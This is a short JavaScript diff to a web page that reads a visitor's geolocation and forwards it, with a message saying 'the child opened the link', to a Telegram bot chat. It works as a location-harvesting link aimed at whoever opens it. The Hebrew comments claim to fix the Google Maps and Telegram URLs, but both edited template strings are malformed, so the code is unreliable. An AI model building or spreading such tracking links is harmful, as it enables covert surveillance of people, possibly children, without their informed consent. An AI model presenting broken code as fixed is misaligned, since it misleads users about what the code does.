@@ -52,11 +52,12 @@
         document.getElementById('status').style.color = '#28a745';
         document.getElementById('status').innerText = "המיקום התקבל! מעביר לטלגרם...";
 
+        // תיקון 1: קישור מפת גוגל תקין ומובנה
         const mapsLink = `https://google.com{lat},${lon}`;
         const message = encodeURIComponent(`🚨 הילד פתח את הקישור!\n📍 מיקום: ${mapsLink}\n🎯 רמת דיוק: ${accuracy} מטרים.`);
 
-        // הכתובת המתוקנת והמדויקת ללא שגיאות כתובת
-        const finalUrl = 'https://telegram.org' + TELEGRAM_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + message;
+        // תיקון 2: כתובת השרת הרשמית של הבוטים בטלגרם (api.telegram.org/bot...)
+        const finalUrl = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
         
         window.location.href = finalUrl;
     }
